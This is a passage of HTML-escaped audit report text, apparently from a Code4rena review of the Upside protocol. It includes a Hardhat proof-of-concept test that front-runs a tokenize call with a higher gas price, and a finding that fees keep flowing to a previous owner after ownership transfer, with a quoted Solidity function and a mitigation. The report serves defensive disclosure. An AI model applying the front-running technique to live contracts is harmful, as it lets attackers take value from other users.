class=\"mtk12\"\u003eupsideProtocol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etokenize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurl1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidityTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egasPrice:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;gwei\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Low priority\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// User2 submits the same transcation with higher gas price to front-run\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2Tx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eupsideProtocol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etokenize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eurl1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidityTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egasPrice:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;100\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;gwei\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// High priority\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Mine the transactions, user2\u0026#39;s should be prioritized\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enetwork\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprovider\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;evm_mine\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Reactivate auto-mining for normal operation\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enetwork\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprovider\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;evm_setAutomine\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, [\u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Verify that user1\u0026#39;s transaction failed because the URL was already tokenized\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1Tx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003erevertedWithCustomError\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eupsideProtocol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;MetaCoinExists\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  }).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etimeout\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100000000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id=\"02-transferring-ownership-may-result-in-fees-being-unintentionally-paid-to-the-previous-owner\" style=\"position:relative;\"\u003e\u003ca href=\"#02-transferring-ownership-may-result-in-fees-being-unintentionally-paid-to-the-previous-owner\" aria-label=\"02 transferring ownership may result in fees being unintentionally paid to the previous owner permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[02] Transferring ownership may result in fees being unintentionally paid to the previous owner\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L337-L353\"\u003ehttps://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L337-L353\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact\" aria-label=\"finding description and impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eIn the protocol, the \u003ccode\u003etokenizeFeeDestinationAddress\u003c/code\u003e is a configurable parameter that determines where tokenization fees are sent when the fee system is enabled. This address is set by the \u003ccode\u003eowner\u003c/code\u003e of the contract using a function \u003ccode\u003esetFeeInfo\u003c/code\u003e.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ( \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeDeployerBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ||\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeDecayBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ||\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeFinalBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeStartingBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ||\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeSellBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ||\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e\u0026gt;\u0026gt;          \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenizeFeeDestinationAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) ||\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeStartingBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeFinalBp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapFeeDecayInterval\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eInvalidSetting\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eFeeInfoSet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_newFeeInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHowever, when ownership of the contract is transferred using the standard \u003ccode\u003eOwnable\u003c/code\u003e pattern (e.g., via \u003ccode\u003etransferOwnership()\u003c/code\u003e), the \u003ccode\u003etokenizeFeeDestinationAddress\u003c/code\u003e does not automatically update to reflect the new owner. As a result, all tokenization fees continue being sent to the previous owner, even though they no longer control the contract. This creates a temporal vulnerability between the point of ownership transfer and the point at which the new owner explicitly updates the fee configuration. If the new owner delays or forgets to call \u003ccode\u003esetFeeInfo\u003c/code\u003e, then fees are still sent to the previous owner.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eOverride the \u003ccode\u003etransferOwnership()\u003c/code\u003e from \u003ccode\u003eOwnable\u003c/code\u003e to check that if the current fee recipient is the owner trying to exit, then it should revert.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-1\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eIn \u003ccode\u003ePoC.test.ts\u003c/code\u003e, make the following modification:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"5\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import { HardhatEthersSigner } from \u0026quot;@nomicfoundation/hardhat-ethers/signers\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import { ethers as hhethers } from \u0026quot;hardhat\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    import {IERC20Metadata, UpsideMetaCoin, UpsideProtocol, UpsideStakingStub} from \u0026quot;../types\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   import { expect } from \u0026quot;chai\u0026quot;;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    describe(\u0026quot;C4 PoC Test Suite\u0026quot;, function () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ---snip---\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        let user1: HardhatEthersSigner;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+       let user2: HardhatEthersSigner;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ---snip---\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        before(async function () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            signers = await hhethers.getSigners();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            owner = signers[2];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            user1 = signers[0];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+           user2 = signers[1];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            ---snip---\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+       // the test below goes here\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eAdd the following test in the same file:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"6\"\u003e\u003ccode 